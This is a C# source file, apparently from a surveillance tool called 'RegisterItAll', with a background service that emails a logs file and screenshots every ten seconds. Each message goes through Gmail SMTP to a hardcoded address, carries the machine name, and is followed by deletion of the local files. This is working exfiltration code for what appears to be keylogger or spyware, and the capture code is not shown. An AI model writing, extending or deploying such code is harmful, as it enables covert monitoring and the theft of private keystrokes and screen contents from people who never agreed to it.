using RegisterItAll.Managers;
using RegisterItAll.Services.Base;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace RegisterItAll.Services
{
    public partial class EmailSenderService : ExecutableAsConsoleApplicationService
    {
        private const int DelaySecons = 10;
        private const string emailAddress = "email@gmail.com";
        private const string emailPassword = "pass";

        protected override async void OnStart(string[] args)
        {
            while (true)
            {
                await Task.Delay(DelaySecons * 1000);

                try
                {
                    SendEmail();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
        }

        private static void SendEmail()
        {
            MailMessage message = new MailMessage()
            {
                From = new MailAddress(emailAddress, displayName: null, Encoding.UTF8),
                Subject = $"RegisterItAll ({Environment.MachineName})",
                SubjectEncoding = Encoding.UTF8,
            };

            message.To.Add(emailAddress);

            string logsFile = FilesManager.GetLogsFile();
            message.Attachments.Add(new Attachment(logsFile));

            IEnumerable<string> screenshots = FilesManager.GetScreenshots();
            foreach (string screenshot in screenshots)
            {
                message.Attachments.Add(new Attachment(screenshot));
            }

            SmtpClient client = new SmtpClient()
            {
                Credentials = new NetworkCredential(emailAddress, emailPassword),
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
            };

            client.Send(message);

            message.Dispose();
            client.Dispose();

            FilesManager.RemoveLogsFile(logsFile);
            FilesManager.RemoveScreenshots(screenshots);
        }
    }
}